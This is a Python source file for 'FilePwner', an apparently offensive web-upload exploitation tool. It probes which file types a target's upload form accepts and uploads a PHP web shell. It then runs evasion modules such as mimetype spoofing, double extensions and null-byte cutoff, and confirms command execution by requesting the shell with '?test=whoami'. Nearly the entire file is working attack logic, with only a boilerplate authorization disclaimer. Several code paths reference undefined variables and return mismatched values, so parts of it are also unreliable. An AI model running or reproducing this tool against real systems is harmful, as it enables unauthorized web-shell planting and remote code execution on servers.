import argparse
import random
from socket import timeout
import string
import base64
import xml.etree.ElementTree as ET
import sys
import termcolor
import warnings
import os
import re
import time
import requests
import importlib
from requests.exceptions import SSLError
import json
import variations as variations
from argparse import RawTextHelpFormatter

#TODO
#   Parse shell upload dir from response for dynamic names
#   Add custom injection markers

# Set of colors
red = '\u001b[31;1m'
orange = '\u001b[38;5;208m'
reset = '\033[0m'
yellow = '\u001b[33;1m'
blue = '\u001b[34;1m'
light_blue = '\033[34;1m'
green = '\033[1;32m'
white = '\u001b[37;1m'
dark_grey = '\033[90m'
red_italic = '\x1b[31;3;1m'

parser = argparse.ArgumentParser(formatter_class=RawTextHelpFormatter)

parser.add_argument('-r', "--request-file", dest="request_file", default=False, help=f"{red}Required{reset} - Read from a HTTP/S request file (replace the file content with the string *content* and filename extension with the string *filename*)")
parser.add_argument('-t', "--true-regex", type=str, dest="true_regex", default=False,help=f"{red}Required{reset} - Provide the success message when a file is uploaded\n{reset}Usage: {blue}-s /--success {reset}{red_italic}'File uploaded successfully.'{reset}")
parser.add_argument('-f', "--false-regex", type=str, dest="false_regex", default=False,help=f"{red}Required{reset} - Provide a failure message when a file is uploaded\n{reset}Usage: {blue}-f /--failure {reset}{red_italic}'File is not allowed!'{reset}")
#parser.add_argument('-e', "--extension", type=str, dest="file_extension", default="not_selected", help=f"{red}Required {reset}- Provide server backend extension\n{reset}Usage: {blue}-e / --extension {reset}{red_italic}php (Supported extensions: php,asp,jsp,perl,coldfusion){reset}")
#parser.add_argument('-a', "--allowed-extensions", type=str, dest="allowed_extensions", default=False, help=f"{red}Required {reset}- Provide allowed extensions to be uploaded\n{reset}Usage: {blue}-a /--allowed {reset}{red_italic}jpeg, png, zip, etc'{reset}")
parser.add_argument('-d', "--upload-dir", type=str, dest="upload_dir", default=False, help=f'Provide a remote path where the WebShell will be uploaded (won\'t work if the file will be uploaded with a UUID).\n{reset}Usage: {blue}-l / --location {reset}{red_italic}/uploads/{reset}')
#parser.add_argument('-o', "--output", type=str, dest="output_location",help=f'Output directory (not file) to save the results in - Default is the current directory.\n{reset}Usage: {blue}-o / --output {reset}{red_italic}~/Desktop/example.com/{reset}',default=False)
parser.add_argument("--rate-limit", type=float, dest="rate_limit", default=0.1,help=f'Set rate-limiting with seconds between each request.\nUsage: {blue}--rate-limit {reset}')
#parser.add_argument("--proxy", type=str, dest="proxy_num", default="optional",help=f"Channel the HTTP requests via proxy client (i.e Burp Suite).\nUsage: {blue}-p / --proxy {reset}{red_italic}http://127.0.0.1:8080{reset}")
parser.add_argument('-v', "--verbose", type=int, dest="global_verbosity", default=0,help=f"If set, details about the test will be printed on the screen\nUsage:{blue} -v / --verbose{reset}")
parser.add_argument("--timeout", action="store_true", dest="timeout", default=20, help=f"Number of seconds the request will wait before timing out (Default: 20)\nUsage:{blue} -t / --timeout{reset}")
parser.add_argument("--print-response", action="store_true", dest="response", default=False,help=f"If set, HTTP response will be printed on the screen\nUsage:{blue} -v / --verbose{reset}")

options = parser.parse_args()

if (not options.upload_dir.startswith("/")):
        options.upload_dir = "/" + options.upload_dir
if (not options.upload_dir.endswith("/")):
    options.upload_dir = options.upload_dir + "/" 

def error(message):
    print(f"{red}[!!!]{reset}  {message}")
    print("")
    exit(1)

def info(message, verbosity=None, spacing=True):
    global options
    if (verbosity != None):
        if (verbosity > options.global_verbosity):
            return

    if spacing: print()
    print(f"{light_blue}[i]{reset}  {message}")
    if spacing: print()

def warning(message):
    print(f"{orange}[!]{reset}  {message}")

def success(message):
    print(f"{yellow}[+]{reset}  {message}")

def failure(message, verbosity=None):
    global options
    if (verbosity != None):
        if (verbosity > options.global_verbosity):
            return
    print(f"{dark_grey}[-]{reset}  {message}")

def debug(message, verbosity=None):
    global options
    if (verbosity != None):
        if (verbosity > options.global_verbosity):
            return

    print(message)

def exit_success(url):
    print()
    print(f"Your shell is available at {url}")
    print(f"You can interract with it using the 'test' parameter: {url}?test=whoami")
    print()
    print()
    exit(1)

def banner():
    print()
    print("███████╗██╗██╗     ███████╗██████╗ ██╗    ██╗███╗   ██╗███████╗██████╗ ")
    print("██╔════╝██║██║     ██╔════╝██╔══██╗██║    ██║████╗  ██║██╔════╝██╔══██╗")
    print("█████╗  ██║██║     █████╗  ██████╔╝██║ █╗ ██║██╔██╗ ██║█████╗  ██████╔╝")
    print("██╔══╝  ██║██║     ██╔══╝  ██╔═══╝ ██║███╗██║██║╚██╗██║██╔══╝  ██╔══██╗")
    print("██║     ██║███████╗███████╗██║     ╚███╔███╔╝██║ ╚████║███████╗██║  ██║")
    print("╚═╝     ╚═╝╚══════╝╚══════╝╚═╝      ╚══╝╚══╝ ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝")
    print()
    print("v1.0")
    print()
    info("Disclaimer: The use of this tool and techniques should only be performed with proper authorization and consent from the targeted systems or networks. Unauthorized use can lead to legal consequences. It is the responsibility of the user to ensure that the tool is used for its intended purpose and not for any malicious or illegal activities.")
    print()     
    print("-----------------------------------------------------------------------")     
    print()      

def progress_bar(current, max, bar_length=30):
    progress = current / max
    block = int(round(bar_length * progress))
    progress_bar = f"[{'=' * block}{' ' * (bar_length - block)}] (" + str(current) + "/" + str(max) + ")"
    if (progress < 1):
        print(progress_bar, end='\r') 
    else:
        print(progress_bar)                                          

def GET(url):
    global options
    timeout_seconds = options.timeout

    response = requests.get(url, timeout=timeout_seconds)
    
    return response

def generate_random_string(length):
    characters = string.ascii_letters + string.digits
    random_string = ''.join(random.choice(characters) for _ in range(length))
    return random_string

def parse_request_file(request_file):

    content = ""

    with open(request_file) as f:

        for line in f:
            content += line.rstrip() + '\n'

        # Split the request into headers and body

        headers_end_index = content.find('\n\n')

        if headers_end_index == -1:
            headers_end_index = content.find('\n\r\n')

        headers_content = content[:headers_end_index]

        # Extract the headers

        headers_list = re.findall(r'^(?P<name>[^:\r\n]+):\s*(?P<value>[^\r\n]*)', headers_content,

                                    flags=re.MULTILINE)

        headers_list = [{'key': key.strip(), 'value': value.strip()} for key, value in headers_list]

        headers = {item['key']: item['value'] for item in headers_list}
        # Split the request string by lines

        lines = content.split('\n')

        # Extract the host value

        host = [line.split(': ')[1] for line in lines if line.startswith('Host')][0]

        # Extract the path

        path = lines[0].split(' ')[1]

        url = f"http://{host}{path}"

    return content, headers, host, path

def test_accepted_formats(request_file, session):
    extensions_array = variations.extensions["normal"]
    extensions_array.append("php")
    accepted_extensions = list()
    for extension in extensions_array:
        with open(f"assets/sample_files/sample.{extension}", 'rb') as file: file_data = file.read()
        response, session, headers, url, file_name = upload(request_file, session, file_data, f".{extension}", variations.mimetypes[extension])
        if (check_success(response)):
            success(f"Filetype {extension} is accepted")
            accepted_extensions.append(extension)
        else:
            failure(f"Filetype {extension} is not accepted")

    return accepted_extensions

def check_success(response):
    global options
    if (options.true_regex != False):
        return bool(re.search(options.true_regex, response.text))

    if (options.false_regex != False):
        return not bool(re.search(options.false_regex, response.text))

def check_shell(url):
    response = GET(url + "?test=echo%20'reflective_value_123321'")
    if ("reflective_value_123321" in response.text):
        return True
    else: 
        return False

def upload(request_file, session, file_data, file_extension, file_content_type, timeout=20):
    global options

    time.sleep(options.rate_limit)
    decoded_data = file_data.decode('latin-1')

    with open(request_file, 'r') as file:
        file_contents = file.read()

        if "*filename*" not in file_contents:
            error("Inject point *filename* not present in the request file")

        if "*content*" not in file_contents:
            error("Inject point *content* not present in the request file")

    file_data_new = decoded_data

    file_name = generate_random_string(10) + file_extension

    content, headers, host, path = parse_request_file(request_file)
    content = content.replace("*filename*", file_name)

    url = f"http://{host}/{path}"

    try:
        if isinstance(content, list):
            content = ''.join(content)
            content = content.split('\r\n\r\n', 1)
            content = content[1]

        elif isinstance(content, dict):
            content = str(content)
            content = content.split('\r\n\r\n', 1)
            content = content[1]

        elif isinstance(content, str):
            content = content.split('\r\n\r\n', 1)
            content = content[1]

    except IndexError:
        content = ''.join(content)
        content = content.split('\n\n', 1)
        content = content[1]

    data = False
    if isinstance(file_data_new, bytes):
        file_data_new = file_data_new.decode('latin-1')

    content = content.replace("*content*", file_data_new)

    # Extract attributes based on the content type
    if "multipart/form-data" in str(headers):

        data = str(content)

        pattern = re.compile(rf'filename="{file_name}".*?Content-Type: (.*?)(?=\n|$)', re.DOTALL)
        multipart_data = pattern.sub(f'filename="{file_name}" \nContent-Type: {file_content_type}', data)

        try:
            response = session.post(url, data=multipart_data, headers=headers,allow_redirects=False, verify=False, timeout=options.timeout)  # Sending a POST request to the url with the files, headers, and data provided.
        except SSLError:

            url_http = url.replace('https://', 'http://')  # Change protocol to http

            warning(f"SSL error occurred. Trying HTTP...")  
            response = session.post(url_http, data=multipart_data, headers=headers, allow_redirects=False, timeout=options.timeout)  # Sending a POST request to the url with the files, headers, and data provided.
            
        if (response.status_code == 404):
            error(f"404 status on requested URL {url}")

        #print(response.text)
        return response, session, headers, url, file_name
                
  
    elif "application/json" in str(headers):
        # Extract the JSON data from the request body
        match = re.search(r'(\r\n\r\n|\n\n)(\{.*\})', content, re.DOTALL)
        if match:
            json_data = match.group(2)
            try:
                json_data = json_data.replace("\\", "\\\\")
                json_data = json_data.replace(".\\", ".\\\\")

                json_obj = json.loads(json_data)

                data = json_obj

                temp_data = str(data)

                try:
                    for content_type, key in variations.content_types.items():
                        if content_type in temp_data:
                            data[key] = content_type_header.rstrip()
                            break

                    if '*mimetype*' in str(data).lower():
                        temp_data = temp_data.replace("*mimetype*", content_type_header)
                        temp_data = temp_data.replace("'", '"')
                        data = json.loads(temp_data)

                except:
                    if isinstance(file_data_new, str):
                        file_data_new = file_data_new.encode("latin-1")
                        file_data_new = base64.b64encode(file_data_new)
                        file_data_new = file_data_new.decode("latin-1")
                        content = content.replace("*content*", file_data_new.strip())

                    else:
                        if isinstance(file_data_new, bytes):
                            file_data_new = file_data_new.decode('latin-1')

                        content = content.replace("*content*", file_data_new)

                        # Create a dictionary with the file data and other fields
                data = {
                    **data
                }
                
                try:
                    response = session.post(url, json=data, headers=headers, proxies=proxies,
                                        allow_redirects=False,
                                        verify=tls)  # Sending a POST request to the url with the files, headers, and data provided.
                except SSLError:
                    url_http = url.replace('https://', 'http://')  # Change protocol to http
                    print(f"{red}[WARN]{reset} SSL error occurred. Trying HTTP...")  
                    response = session.post(url_http, json=data, headers=headers, proxies=proxies,
                                        allow_redirects=False)  # Sending a POST request to the url with the files, headers, and data provided.
                    
                return response, session, content_type_header, headers, url

            except json.JSONDecodeError as e:
                print(e)
                print("Error decoding JSON data.")
                exit(1)
        else:
            # Attempting the second match
            second_match = re.search(r'(\{.*\})', content, re.DOTALL)
            if second_match:
                json_data = second_match.group(1)

                json_data = json_data.replace("\\", "\\\\")
                json_data = json_data.replace(".\\", ".\\\\")

                json_obj = json.loads(json_data)

                data = json_obj

                temp_data = str(data)

                try:
                    for content_type, key in variations.content_types.items():
                        if content_type in temp_data:
                            data[key] = content_type_header.rstrip()
                            break

                        if '*mimetype*' in str(data).lower():
                            temp_data = temp_data.replace("*mimetype*", content_type_header)
                            temp_data = temp_data.replace("'", '"')
                            data = json.loads(temp_data)

                except:
                    if isinstance(file_data_new, str):
                        file_data_new = file_data_new.encode("latin-1")
                        file_data_new = base64.b64encode(file_data_new)
                        file_data_new = file_data_new.decode("latin-1")
                        content = content.replace("*content*", file_data_new.strip())

                    else:
                        if isinstance(file_data_new, bytes):
                            file_data_new = file_data_new.decode('latin-1')

                        content = content.replace("*content*", file_data_new)

                        # Create a dictionary with the file data and other fields
                data = {
                    **data
                }
                
                try:
                    response = session.post(url, json=data, headers=headers, proxies=proxies,
                                            allow_redirects=False,
                                            verify=tls)  # Sending a POST request to the url with the files, headers, and data provided.
                except SSLError:
                    url_http = url.replace('https://', 'http://')  # Change protocol to http
                    print(f"{red}[WARN]{reset} SSL error occurred. Trying HTTP...")  
                    response = session.post(url_http, json=data, headers=headers, proxies=proxies,
                        allow_redirects=False)  # Sending a POST request to the url with the files, headers, and data provided.
                    
                return response, session, content_type_header, headers, url

            else:
                # Handle the case where no match was found
                raise Exception("No JSON data found")

    elif "application/xml" in str(headers):

        # Extract the XML data from the request body
        match = re.search(r'(\r\n\r\n|\n\n)(<.*>)', content, re.DOTALL)
        if match:
            xml_data = match.group(2)
            try:
                data = xml_data

            except ET.ParseError:
                print("Error parsing XML data")
                exit(1)

        root = ET.fromstring(data)

        for content_type, key in variations.content_types.items():
            if content_type in data:
                content_type_element = root.find(f'.//{key}')
                content_type_element.text = content_type_header.rstrip()
                data[key] = content_type_header.rstrip()
                break
        else:
            print("Something went wrong...")
            exit(1)

        if not isinstance(data, str):
            data = ET.tostring(root, encoding='latin-1').decode('latin-1')
        
        try:
            response = session.post(url, data=data, headers=headers, proxies=proxies,
                                allow_redirects=False,
                                verify=tls)  # Sending a POST request to the url with the files, headers, and data provided.
        except SSLError:
            url_http = url.replace('https://', 'http://')  # Change protocol to http
            print(f"{red}[WARN]{reset} SSL error occurred. Trying HTTP...")  
            response = session.post(url_http, data=data, headers=headers, proxies=proxies,
                                allow_redirects=False)  # Sending a POST request to the url with the files, headers, and data provided.

        return response, session, content_type_header, headers, url

    elif "XMLHttpRequest" in str(headers):

        headers['Content-Type'] = content_type_header.rstrip()

        try:
            response = session.post(url, data=content, headers=headers, proxies=proxies,
                                    allow_redirects=False,
                                    verify=tls)  # Sending a POST request to the url with the files, headers, and data provided.
        except SSLError:
            url_http = url.replace('https://', 'http://')  # Change protocol to http
            print(f"{red}[WARN]{reset} SSL error occurred. Trying HTTP...")  
            response = session.post(url_http, data=content, headers=headers, proxies=proxies,
                                allow_redirects=False)  # Sending a POST request to the url with the files, headers, and data provided.
            
        return response, session, content_type_header, headers, url

    else:
        headers['Content-Type'] = content_type_header.rstrip()

        try:
            response = session.post(url, data=content, headers=headers, proxies=proxies,
                                    allow_redirects=False,
                                    verify=tls)  # Sending a POST request to the url with the files, headers, and data provided.
        except SSLError:    
            url_http = url.replace('https://', 'http://')  # Change protocol to http
            print(f"{red}[WARN]{reset} SSL error occurred. Trying HTTP...")  
            response = session.post(url_http, data=content, headers=headers, proxies=proxies,
                                allow_redirects=False)  # Sending a POST request to the url with the files, headers, and data provided.
            
        return response, session, content_type_header, headers, url

def upload_and_validate(request_file, session, file_data, file_extension, mimetype, message, expect_interaction=True, real_extension=None):
    global options

    content, headers, host, path = parse_request_file(request_file)
    response, session, headers, url, file_name = upload(request_file, session, file_data, file_extension, mimetype)
    if (real_extension != None): file_name = (file_name.split(".")[0]) + real_extension
    upload_url = f"http://{host}{options.upload_dir}"
    if (check_success(response)):
        if expect_interaction: success(message + "\n")

        if (check_shell(upload_url + file_name) == True):
            if not expect_interaction: success(message + "\n")
            success("Shell confirmed interactable")
            exit_success(upload_url + file_name)
        else:
            if (expect_interaction):
                debug((upload_url + file_name + "?test=whoami"), 1)
                error("Shell does not seem to be interractable, make sure your upload directory is correct")

    failure(message)
    return session

def main():
    global options

    banner()

    if (options.request_file == False):
        error("Select a HTTP request file with -r / --request-file")
    
    if (options.true_regex == False and options.false_regex == False):
        error("You need to select a true or a false regex pattern")

    if (options.upload_dir == False):
        warning("Upload location not set, defaulting to '/'")

    #Test for accepted formats
    info("Testing for accepted file types")
    print()
    session = requests.Session()
    content, headers, host, path = parse_request_file(options.request_file)
    upload_url = f"http://{host}{options.upload_dir}"

    accepted_extensions = test_accepted_formats(options.request_file, session)
    debug(accepted_extensions, 3)
    if (len(accepted_extensions) < 1):
        error("No accepted extensions found")
    if ("php" in accepted_extensions):
        info("Trying to upload .php shell...")
        with open("assets/shells/simple.php", 'rb') as file: file_data = file.read()
        response, session, headers, url, file_name = upload(options.request_file, session, file_data, ".php", "application/x-httpd-php")
        if (check_success(response)):
            success("Shell successfully uploaded")
            if (check_shell(upload_url + file_name) == True):
                success("Shell confirmed interractable")
                exit_success(upload_url + file_name)
            else:
                debug((upload_url + file_name + "?test=whoami"), 1)
                error("Shell does not seem to be interractable, make sure your upload directory is correct")
            


    
    #Get baseline response
    '''
    info("Getting baseline response from upload dir", 3)
    nonexistent_file = upload_url + generate_random_string(20) + ".php"
    response = GET(nonexistent_file)
    baseline_response = [response.status_code, response.text]
    debug(baseline_response, 3)
    '''

    #Loop through modules
    print()
    info("Starting module execution")
    
    active_modules = [
        "mimetype_spoofing",
        "double_extension",
        "reverse_double_extension",
        "null_byte_cutoff"
    ]

    modules = importlib.import_module("modules")

    for module in active_modules:
        getattr(modules, module)(options.request_file, session, options, accepted_extensions)



if __name__ == "__main__":
    main()